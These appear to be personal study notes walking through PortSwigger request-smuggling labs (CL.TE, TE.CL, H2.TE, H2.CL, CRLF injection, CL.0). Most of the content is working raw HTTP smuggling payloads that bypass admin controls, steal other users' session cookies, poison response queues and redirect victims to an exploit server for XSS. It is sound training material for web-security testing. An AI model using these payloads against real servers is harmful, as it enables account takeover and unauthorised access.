# HTTP Request Smuggling Notes

You need to include the trailing sequence `\r\n\r\n` in burp following the 0 in requests using TE.CL

In addition, in burp uncheck the `Update Content-Length` header

[Portswigger](https://portswigger.net/web-security/request-smuggling)
[Working with http/2 in burp](https://portswigger.net/burp/documentation/desktop/http2)

In burp repeater what to change in settings to test `http/1` or `http/2`:

![image](https://github.com/user-attachments/assets/91c35df6-6961-421c-8179-4790ef2db1b8)

(NOTE: To inject newlines into HTTP/2 headers, use the Inspector to drill down into the header, then press the Shift + Return keys. Note that this feature is not available when you double-click on the header)


## Methodology

### CL.TE example test

Example request to test for CL.TE

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```

Content-Length will be forwarded as it fits correctly, omitting the X. Then the Transfer-Encoding of the backend will process the first chunk (The 1, and A), then come to the X and awai for the next chunk to arrive causing a time delay.

### TE.CL Example test

Example request to test for TE.CL

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 6

0

X
```

The transfer encoding header gets checked and only passes part of the request, omitting the X. The back-end server uses the `Content-Length` header, expects more content in the message body and waits causing the time delay to detect.

## Labs Walkthrough

### HTTP request smuggling, confirming a CL.TE vulnerability via differential responses

Send this in repeater twice, to get a smuggle in and get a 404 error

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Ignore: X
```

### HTTP request smuggling, confirming a TE.CL vulnerability via differential responses

Send this twice

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

### Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability

- try to go to /admin
- use repeater and issue the following request twice

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-Ignore: X
```

- the request gets denied due to not having the `Host:Localhost` header
- send the below requst twice

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 54
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
X-Ignore: X
```

- the request was blocked due to the second request's Host header conflicting with the smuggled Host header.
- now do this so that the second requests headers are appened to the smuggled request body instead, and send twice

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```

- you can now access the admin panel, craft the delection of carlos like so:

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 139
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```

### Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability

- similar to above go to /admin see that you're blocked, so send blow twice

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-length: 4
Transfer-Encoding: chunked

60
POST /admin HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

**You need to include the trailing sequence \r\n\r\n following the final 0**

- make sure to include the `Host:localhost` header

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

71
POST /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

- now delete carlos

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-length: 4
Transfer-Encoding: chunked

87
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

### Exploiting HTTP request smuggling to reveal front-end request rewriting

To solve the lab, smuggle a request to the back-end server that reveals the header that is added by the front-end server. Then smuggle a request to the back-end server that includes the added header, accesses the admin panel, and deletes the user carlos. 

- again go to /admin, but notice it will only be loaded from 127.0.0.1, we find that the search function on the site reflects the value of the search parameter
- use burp repeater to issue the request twice

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 124
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 200
Connection: close

search=test
```

- the reflected response should contain the second responses with the start of a rewritten HTTP request that we can attempt to pull the secret header from
- we find a header with a `X-*-IP` formated header in the rewritten reflected response, this should be added to our smuggled payload now

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 143
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-*-IP: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Connection: close

x=1
```

-  now delete carlos

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 166
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
X-abcdef-Ip: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Connection: close

x=1
```

### Exploiting HTTP request smuggling to capture other users' requests

Background for the lab:

```
Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.

The lab simulates the activity of a victim user. Every few POST requests that you make to the lab, the victim user will make their own request. You might need to repeat your attack a few times to ensure that the victim user's request occurs as required

If you encounter a timeout, this may indicate that the number of bytes you're trying to capture is greater than the total number of bytes in the subsequent request. Try reducing the Content-Length specified in the smuggled request
```

- visit blog post and post a comment, send the `comment-post` request to burp prepeater, move the body parameters so `comment=` is the last
- increase the `comment-post` requests content-length to 400 then send it as the smuggled http request like so

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 256
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=your-session-token

csrf=your-csrf-token&postId=5&name=Carlos+Montoya&email=carlos%40normal-user.net&website=&comment=test
```

- the sweet spot for me was like 850 characters for the `content-length` otherwise the website will constantly hang and then you'd have to rebuild it to send again. once you see the users cookie header in the blog post you are successful at getting their session and can log in as them with replacing your cookie with theirs.

### Exploiting HTTP request smuggling to deliver reflected XSS

Background:
```
 This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.

The application is also vulnerable to reflected XSS via the User-Agent header.

To solve the lab, smuggle a request to the back-end server that causes the next user's request to receive a response containing an XSS exploit that executes alert(1). 
```

same as above change the request to `http/1` in burp repeaters request attributes

- Visit blog post, and send the request to burp repeater
- observer the use of the `User-Agent` header, and observe that it gets reflected with this payload: `"/><script>alert(1)</script>`
- smuggle the xss request to the back end server:

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 150
Transfer-Encoding: chunked

0

GET /post?postId=5 HTTP/1.1
User-Agent: a"/><script>alert(1)</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1
```

### Response queue poisoning via H2.TE request smuggling

Background: 
```
 This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests even if they have an ambiguous length.

To solve the lab, delete the user carlos by using response queue poisoning to break into the admin panel at /admin. An admin user will log in approximately every 15 seconds.

The connection to the back-end is reset every 10 requests, so don't worry if you get it into a bad state - just send a few normal requests to get a fresh connection. 
```

- In burp repeater send any request, even one to just `/` and try an arbitrary prefix in the body of the HTTP/2 request using chunked encoding like so, (make sure the request attributes in the repeater settings is set to HTTP/2):

```
POST / HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Transfer-Encoding: chunked

0

SMUGGLED
```

- and keep sending and you'll notice you get a 404 for every second request, this confirms it is being smuggled and the subsequent request is being smuggled
- in burp repeater now create the following request which smuggles a complete request to the back-end server

```
POST /x HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Transfer-Encoding: chunked

0

GET /x HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```

(Remember to terminate the smuggled request properly by including the sequence \r\n\r\n after the Host header)

- send the above request to poison the queue, wait for 5 seconds, then send the request again to fetch an arbitrary response, this needs to be repeated until you get a different response then 404. In one we will get a 302 with the admin's session cookie
- use session cookie to sign in, then delete the carlos user

### H2.CL request smuggling

Background:

```
To solve the lab, perform a request smuggling attack that causes the victim's browser to load and execute a malicious JavaScript file from the exploit server, calling alert(document.cookie). The victim user accesses the home page every 10 seconds. 
```

- in burp repeater send a random request, even one to `/` and change the `content-length` to 0. Again make sure burp repeaters settings are set to `http/2`

```
POST / HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Content-Length: 0

SMUGGLED
```

- notice every second request gives a 404, showing we are smuggling to the backend
- now use burp repeater to send a request to `GET /resources` and notice you are redirected to `https://YOUR-LAB-ID.web-security-academy.net/resources/`
- send a smuggling request to smuggle the start of a request for `/resources`, along with an arbitrary `Host` header

```
POST / HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Content-Length: 0

GET /resources HTTP/1.1
Host: foo
Content-Length: 5

x=1
```

- send this a few times, and notice you do get redirected to the arbitrary host
- go to the exploit server and change the file path to `/resources`, in the body enter the payload `alert(document.cookie)`, the store the exploit
- in burp repeater now edit your request to point to the exploit server

```
POST / HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Content-Length: 0

GET /resources HTTP/1.1
Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
Content-Length: 5

x=1
```

- send this request a few times, and confirm that you get redirected to the exploit server
- resend the request and wait for 10 seconds
- go to exploit server and check the access log, if you see a `GET /resources/` request from the victim this means our exploit worked
- just keep doing this until the lab solves

### HTTP/2 request smuggling via CRLF injection

Background:

```
This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests and fails to adequately sanitize incoming headers.

To solve the lab, use an HTTP/2-exclusive request smuggling vector to gain access to another user's account. The victim accesses the home page every 15 seconds.

If you're not familiar with Burp's exclusive features for HTTP/2 testing, please refer to the documentation for details on how to use them. 
```

- In Burp's browser, use the lab's search function a couple of times and observe that the website records your recent search history. Send the most recent POST / request to Burp Repeater and remove your session cookie before resending the request. Notice that your search history is reset, confirming that it's tied to your session cookie
- make sure burp repeater attributes settings is set to `http/2`
- ![image](https://github.com/user-attachments/assets/bb09247b-5703-430d-8b48-5d65c40331ee)
- using inspector add an arbitrary header to the request, append the sequence `\r\n` to the headers value, followed by the `Transfer-Encoding: chunked` header with this, make sure a \r\n is correctly added into the header value:
```
bar
Transfer-Encoding: chunked
```
- ![image](https://github.com/user-attachments/assets/8a9bc52a-d6d0-4155-bfe6-eaf0b3e47697)
- ![image](https://github.com/user-attachments/assets/9b7606c9-3c5a-45a6-be6c-eb670a7c6ffd)
- ![image](https://github.com/user-attachments/assets/47c8bcd0-0f40-4aeb-9799-b15efd5cba7f)
- in the body attempt to smuggle an arbitrary prefix as follows, noticing that every second request gets a 404 response, indicating it has casued the back-end to append the request to the smuggled prefix 

```
0

SMUGGLED
```

- ![image](https://github.com/user-attachments/assets/2508fc08-830d-4fb0-821d-e1614bb0b76d)
- ![image](https://github.com/user-attachments/assets/e2786378-b2d5-4d4a-9574-c9c2d8903b23)
- change the body of the request to the following

```
0

POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Length: 800

search=x
```

- ![image](https://github.com/user-attachments/assets/434816eb-d089-4cf1-a7f8-6508d81ba6a9)
- now we refresh the page and we can see it wrote the request as a recent search, getting the other users cookie value. (if in the response it's a `POST` you refreshed too early and need to try again to steal the users which should be a `GET` request):
- ![image](https://github.com/user-attachments/assets/4097a559-1a3f-4181-b4f9-1d78ee9a8cd8)

### HTTP/2 request splitting via CRLF injection

Background:

```
 This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests and fails to adequately sanitize incoming headers.

To solve the lab, delete the user carlos by using response queue poisoning to break into the admin panel at /admin. An admin user will log in approximately every 10 seconds.

The connection to the back-end is reset every 10 requests, so don't worry if you get it into a bad state - just send a few normal requests to get a fresh connection. 
```

(NOTE: To inject newlines into HTTP/2 headers, use the Inspector to drill down into the header, then press the Shift + Return keys. Note that this feature is not available when you double-click on the header)

- send a request for `GET /` to repeater, make sure the repeater attributes are set to `http/2`
- change the path to a non-existent endpoint such as `/x`
- ![image](https://github.com/user-attachments/assets/11c0dac0-c1cd-401c-a9ca-fd623e1d54a8)
- using inspector append the arbitrary header to the end of the request
```
Name:
foo
```
```
Value
bar\r\n
\r\n
GET /x HTTP/1.1\r\n
Host: YOUR-LAB-ID.web-security-academy.net

```

- ![image](https://github.com/user-attachments/assets/612fe85b-f163-44d2-96c2-c7a9cd191224)
- repeat until we get a 302 with the users session cookie
- send request like this until you get a `200` and see the admin panel, then delete carlos

```
GET /admin HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=STOLEN-SESSION-COOKIE
```

![image](https://github.com/user-attachments/assets/ac0d7147-2811-4d8c-bb78-c3974f1386f5)

### CL.0 request smuggling

Background
```
 This lab is vulnerable to CL.0 request smuggling attacks. The back-end server ignores the Content-Length header on requests to some endpoints.

To solve the lab, identify a vulnerable endpoint, smuggle a request to the back-end to access to the admin panel at /admin, then delete the user carlos. 
```

- send the GET / request to Burp Repeater twice
- add both of these into a tab in burp repeater
- go to the first request and covert it to a `POST`, in the body of the POST request add an arbitrary request smuggling prefix

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: CORRECT

GET /hopefully404 HTTP/1.1
Foo: x
```

- change the main POST request to point to an arbitrary endpoint that you want to test
- in the send drop down, change the mode to `send group in sequence(single connection)`
- change the connection header of the first request to `keep-alive`
- send the sequence and check the responses, if the server responds to the second request as normal, this is not vulnerable, if it responds to the second request with a typical `404` this indicates that the back-end server is ignoring the `Content-Length` of requests
- Deduce that you can use request for static files under `/resources` such as `/resources/images/blog.svg` to cause a CL.0 desync

Exploitation
- change the path of your smuggled prefix to point to /admin

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: CORRECT

GET /admin HTTP/1.1
Foo: x
```

- then just change it to include the deletion call `GET /admin/delete?username=carlos HTTP/1.1`

### HTTP request smuggling, basic CL.TE vulnerability

- issue the following request twice in burp

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

Note: You need to include the trailing sequence \r\n\r\n following the final 0

### HTTP request smuggling, basic TE.CL vulnerability

- send this twice in repeater

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

Note: You need to include the trailing sequence \r\n\r\n following the final 0

### HTTP request smuggling, obfuscating the TE header

- send twice in repeater

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked
Transfer-encoding: cow

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

Note: You need to include the trailing sequence \r\n\r\n following the final 0
